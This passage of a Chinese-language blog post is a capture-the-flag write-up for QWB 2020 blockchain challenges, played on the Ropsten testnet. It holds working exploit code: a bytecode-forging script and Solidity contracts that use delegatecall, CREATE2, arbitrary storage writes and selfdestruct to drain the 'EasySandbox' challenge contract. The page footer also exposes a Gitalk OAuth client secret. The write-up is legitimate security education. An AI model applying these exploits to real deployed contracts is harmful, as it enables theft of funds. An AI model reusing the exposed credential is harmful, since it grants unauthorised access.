+
+
+
+value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x361778091c101ce450886123aabb8c37cfe1bc31</span>
+target <span style="color:#f92672">=</span> calc(value)
+<span style="color:#66d9ef">print</span>(target)
+
+src_bytecode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;608060405234801561001057600080fd5b5061023b806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806341c0e1b51461003b578063acef0f0714610045575b600080fd5b610043610100565b005b6100fe6004803603602081101561005b57600080fd5b810190808035906020019064010000000081111561007857600080fd5b82018360208201111561008a57600080fd5b803590602001918460018302840111640100000000831117156100ac57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610119565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff5b600073d0283a6180eabf69005253073cd1954e33f2a8d290508073ffffffffffffffffffffffffffffffffffffffff1663acef0f07836040518263ffffffff1660e01b81526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561019e578082015181840152602081019050610183565b50505050905090810190601f1680156101cb5780820380516001836020036101000a031916815260200191505b5092505050600060405180830381600087803b1580156101ea57600080fd5b505af11580156101fe573d6000803e3d6000fd5b50505050505056fea265627a7a72305820f0498cbfcb75e48fd32ce61415a0803073a8761489e886c07bcd20ebc74bf5c364736f6c634300050a0032&#34;</span>
+current <span style="color:#f92672">=</span> tag(src_bytecode)
+<span style="color:#66d9ef">print</span>(current)
+
+pad <span style="color:#f92672">=</span> solve_pad(current, target)
+<span style="color:#66d9ef">print</span>(pad)
+src_bytecode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span>len(src_bytecode)<span style="color:#f92672">%</span><span style="color:#ae81ff">32</span>)
+<span style="color:#66d9ef">assert</span>(tag(src_bytecode<span style="color:#f92672">+</span>pad) <span style="color:#f92672">==</span> target)
+<span style="color:#66d9ef">print</span>(src_bytecode<span style="color:#f92672">+</span>pad)
+</code></pre></div><p>而 <code>create2</code> 计算地址的逻辑，按照规范 <a href="https://eips.ethereum.org/EIPS/eip-1014">https://eips.ethereum.org/EIPS/eip-1014</a> 定义：</p>
+<pre><code>keccak256( 0xff ++ address ++ salt ++ keccak256(init_code))[12:]
+</code></pre><p>所以最后构造的 code 内容为</p>
+<pre><code>0xffD0283a6180EABF69005253073CD1954E33F2a8d200000000000000000000000000000000000000000000000000000000000012341757f78ca722937f3671dc369d44b8ba15e0db59baf13d8e2b96582ecf90781d
+</code></pre><p>攻击相关的交易：</p>
+<ul>
+<li><a href="https://ropsten.etherscan.io/tx/0x4cf8a7fb06b53e68fb09f21f27cb3d25ed1dfb14d1d1ae8d6f71b52d538a3478">tx@0x4cf8a7fb06b53e68fb09f21f27cb3d25ed1dfb14d1d1ae8d6f71b52d538a3478</a></li>
+<li><a href="https://ropsten.etherscan.io/tx/0xd078d96bc5eba7707ee0e936af27780588c86c859eff1a0e1beb60ed9691f49f">tx@0xd078d96bc5eba7707ee0e936af27780588c86c859eff1a0e1beb60ed9691f49f</a></li>
+</ul>
+<h2 id="easysandbox赛后解出">EasySandbox(赛后解出)</h2>
+<p>测试地址 <a href="https://ropsten.etherscan.io/address/0x14830ec81b9ffc26b44b08a025bbf3633f19a5e4">ropsten@0x14830ec81b9ffc26b44b08a025bbf3633f19a5e4</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">10</span>;
+
+<span style="color:#66d9ef">contract</span> EasySandbox {
+    <span style="color:#66d9ef">uint256</span>[] <span style="color:#66d9ef">public</span> writes;
+    <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">address</span>[]) <span style="color:#66d9ef">public</span> sons;
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+    <span style="color:#66d9ef">uint</span> randomNumber <span style="color:#f92672">=</span> RN;
+
+    constructor() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+        owner <span style="color:#f92672">=</span> msg.sender;
+        sons[msg.sender].push(msg.sender);
+        writes.length <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>;
+    }
+
+    <span style="color:#66d9ef">function</span> given_gift(<span style="color:#66d9ef">uint256</span> _what, <span style="color:#66d9ef">uint256</span> _where) <span style="color:#66d9ef">public</span> {
+        <span style="color:#66d9ef">if</span>(_where <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9f</span>) {
+            writes[_where] <span style="color:#f92672">=</span> _what;
+        }
+    }
+
+    <span style="color:#66d9ef">function</span> easy_sandbox(<span style="color:#66d9ef">address</span> _addr) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+        require(sons[owner][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> owner);
+        require(writes.length <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
+        <span style="color:#66d9ef">bool</span> mark <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">uint256</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> sons[owner].length; i<span style="color:#f92672">++</span>) {
+            <span style="color:#66d9ef">if</span>(msg.sender <span style="color:#f92672">==</span> sons[owner][i]) {
+                mark <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+            }
+        }
+        require(mark);
+
+        <span style="color:#66d9ef">uint256</span> size;
+        <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> code;
+
+        <span style="color:#66d9ef">assembly</span> {
+            size <span style="color:#f92672">:=</span> <span style="color:#a6e22e">extcodesize</span>(_addr)
+            code <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mload</span>(<span style="color:#ae81ff">0x40</span>)
+            <span style="color:#a6e22e">mstore</span>(<span style="color:#ae81ff">0x40</span>, <span style="color:#a6e22e">add</span>(code, <span style="color:#a6e22e">and</span>(<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">add</span>(size, <span style="color:#ae81ff">0x20</span>), <span style="color:#ae81ff">0x1f</span>), <span style="color:#a6e22e">not</span>(<span style="color:#ae81ff">0x1f</span>))))
+            <span style="color:#a6e22e">mstore</span>(code, size)
+            <span style="color:#a6e22e">extcodecopy</span>(_addr, <span style="color:#a6e22e">add</span>(code, <span style="color:#ae81ff">0x20</span>), <span style="color:#ae81ff">0</span>, size)
+        }
+
+        <span style="color:#a6e22e">for</span>(uint256 i <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">;</span> i <span style="color:#960050;background-color:#1e0010">&lt;</span> code<span style="color:#960050;background-color:#1e0010">.</span>length<span style="color:#960050;background-color:#1e0010">;</span> i<span style="color:#960050;background-color:#1e0010">++</span>) {
+            require(code<span style="color:#960050;background-color:#1e0010">[</span>i<span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">!=</span> <span style="color:#ae81ff">0xf0</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+            require(code<span style="color:#960050;background-color:#1e0010">[</span>i<span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">!=</span> <span style="color:#ae81ff">0xf1</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+            require(code<span style="color:#960050;background-color:#1e0010">[</span>i<span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">!=</span> <span style="color:#ae81ff">0xf2</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+            require(code<span style="color:#960050;background-color:#1e0010">[</span>i<span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">!=</span> <span style="color:#ae81ff">0xf4</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+            require(code<span style="color:#960050;background-color:#1e0010">[</span>i<span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">!=</span> <span style="color:#ae81ff">0xfa</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+            require(code<span style="color:#960050;background-color:#1e0010">[</span>i<span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">!=</span> <span style="color:#ae81ff">0xff</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+        }
+
+        bool success<span style="color:#960050;background-color:#1e0010">;</span>
+        bytes memory _<span style="color:#960050;background-color:#1e0010">;</span>
+        (success, _) <span style="color:#960050;background-color:#1e0010">=</span> _addr<span style="color:#960050;background-color:#1e0010">.</span><span style="color:#a6e22e">delegatecall</span>(<span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+        require(success)<span style="color:#960050;background-color:#1e0010">;</span>
+        require(writes<span style="color:#960050;background-color:#1e0010">.</span>length <span style="color:#960050;background-color:#1e0010">==</span> <span style="color:#ae81ff">0</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+        require(sons<span style="color:#960050;background-color:#1e0010">[</span>owner<span style="color:#960050;background-color:#1e0010">].</span>length <span style="color:#960050;background-color:#1e0010">==</span> <span style="color:#ae81ff">1</span> <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> sons<span style="color:#960050;background-color:#1e0010">[</span>owner<span style="color:#960050;background-color:#1e0010">][</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">==</span> tx<span style="color:#960050;background-color:#1e0010">.</span><span style="color:#a6e22e">origin</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+    }
+}
+</code></pre></div><p>题目考点是利用 delegatecall 来清空地址的余额，且被调用的合约字节码中不能出现 <code>0xf0</code> / <code>0xf1</code> / <code>0xf2</code> / <code>0xf4</code> / <code>0xfa</code> / <code>0xff</code> 这几个 opcode，即限制了对 <code>CREATE</code> / <code>CALL</code> / <code>CALLCODE</code> / <code>DELEGATECALL</code> / <code>STATICCALL</code> / <code>SELFDESTRUCT</code> 的调用，但题目没有限制 <code>CREATE2</code> 的使用，参考该 opcode 的定义，很明显本题需要我们使用 <code>CREATE2</code> 来清空合约的余额。</p>
+<p><img src="(/images/posts/QWB-2020-Blockchain/create2.png)" alt="CREATE2"></p>
+<p>这里本人的解题思路如下：</p>
+<ol>
+<li>构造交易，利用 <code>given_gift()</code> 的任意写满足 <code>require(sons[owner][0] == owner)</code> 和 <code>msg.sender == sons[owner][i]</code> 这两个条件</li>
+<li>构造合约地址变量 <code>_addr</code>，使得合约 <code>Solve1</code> 的字节码满足对 opcode 的限制</li>
+<li>构造合约 <code>Solve2</code> 获得其字节码，并将字节码部署在地址 <code>_addr</code> 上</li>
+<li>将合约 <code>Solve1</code> 的地址作为参数，调用 <code>easy_sandbox()</code>，然后在函数执行过程中会调用 delegatecall，触发合约 <code>Solve1</code> 的 fallback 函数的执行，fallback 利用 opcode <code>create2</code> 创建合约，清空题目合约的余额，然后利用创建的新合约 <code>Solve2</code>，在构造函数中完成对题目合约的存储修改，进而满足 <code>require(writes.length == 0)</code> 和 <code>require(sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin)</code> 这两个条件。</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> Solve1 {
+    
+    <span style="color:#66d9ef">function</span>() <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">external</span> {
+        <span style="color:#66d9ef">uint256</span> rn <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+        <span style="color:#66d9ef">uint256</span> size;
+        <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> code;
+        <span style="color:#66d9ef">address</span> _addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0e71e1cfbc49E50eA2b08A95A4802896E535F5B4</span>;
+        
+        <span style="color:#66d9ef">assembly</span> {
+            size <span style="color:#f92672">:=</span> <span style="color:#a6e22e">extcodesize</span>(_addr)
+            code <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mload</span>(<span style="color:#ae81ff">0x40</span>)
+            <span style="color:#a6e22e">mstore</span>(<span style="color:#ae81ff">0x40</span>, <span style="color:#a6e22e">add</span>(code, <span style="color:#a6e22e">and</span>(<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">add</span>(size, <span style="color:#ae81ff">0x20</span>), <span style="color:#ae81ff">0x1f</span>), <span style="color:#a6e22e">not</span>(<span style="color:#ae81ff">0x1f</span>))))
+            <span style="color:#a6e22e">mstore</span>(code, size)
+            <span style="color:#a6e22e">extcodecopy</span>(_addr, <span style="color:#a6e22e">add</span>(code, <span style="color:#ae81ff">0x20</span>), <span style="color:#ae81ff">0</span>, size)
+            _addr <span style="color:#f92672">:=</span> create2(<span style="color:#ae81ff">100</span>, <span style="color:#a6e22e">add</span>(code, <span style="color:#ae81ff">0x20</span>), <span style="color:#a6e22e">mload</span>(code), <span style="color:#ae81ff">0x1234</span>)
+        }
+    }
+}
+
+<span style="color:#66d9ef">contract</span> Solve2 {
+    constructor() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+        EasySandbox sb <span style="color:#f92672">=</span> EasySandbox(<span style="color:#ae81ff">0x14830eC81B9fFC26b44b08A025BbF3633f19A5e4</span>);
+        sb.given_gift(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0xd457532626c950612c7d2bfa3d32697a505d03005a86ecac5d5bbe3110d66ae6</span>);
+        sb.given_gift(<span style="color:#66d9ef">uint256</span>(<span style="color:#ae81ff">0xd160625A1b016Acf85288397AA10198eC58d4f55</span>), <span style="color:#ae81ff">0x45f4319ccd4d0ebb459ef413191dbd4441382e8de29c0116d1341ef3e6708596</span>);
+        sb.given_gift(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9d</span>);
+    }
+    
+    <span style="color:#66d9ef">function</span> kill() <span style="color:#66d9ef">public</span> {
+        selfdestruct(msg.sender);
+    }
+}
+</code></pre></div><p>攻击的相关交易：</p>
+<ul>
+<li><a href="https://ropsten.etherscan.io/tx/0xf78e7930cafe21b71e17aec27d933f559352040c07d719766d84fbde78afbac7">set length of  <code>sons[owner]</code></a></li>
+<li><a href="https://ropsten.etherscan.io/tx/0x27b14e1957859f95175d49b1e24dc3547c25f176e2fa55423df1aafba8f9ef7c">set <code>sons[owner][1]</code></a></li>
+<li><a href="https://ropsten.etherscan.io/tx/0x5072cb8bb6fc2e68b9ab320f67c97dac7a68486efb97b638da15bf6a7fe18737">final attack tx</a></li>
+</ul>
+<p>Tips：由于这里需要构造一个合适的合约地址（不被 opcode 黑名单限制），所以该解法需要一定的实操，看了出题师傅的 wp 知道才想起来既然是 delegatecall 的话，由于环境是题目合约的环境，所以直接用 opcode <code>mstore</code> 操作存储就好了（─.─||）</p>
+<h2 id="参考链接">参考链接</h2>
+<ul>
+<li><a href="https://hitcxy.com/2020/qwb2020/">出题师傅的个人非官方 wp- pikachu&rsquo;s Blog: qwb2020</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2020/08/qwb-2020-blockchain/>https://syang-ng.github.io/2020/08/qwb-2020-blockchain/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2020/08/security-2015-uipicker/" class="prev" rel="prev" title="Security 2015 UIPicker"><i class="iconfont icon-left"></i>&nbsp;Security 2015 UIPicker</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+          
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: '10b807dd4496d773d0b9',
+    clientSecret: 'c5fe75039eb62db59ca9181aa20ebb0a9a73a1fc',
+    repo: 'syang-ng.github.io',
+    owner: 'syang-ng',
+    admin: ['syang-ng'],
+    id: location.pathname, 
+    distractionFreeMode: false 
+  });
+  (function() {
+    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+      document.getElementById('gitalk-container').innerHTML = 'Gitalk comments not available by default when the website is previewed locally.';
+      return;
+    }
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2020</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
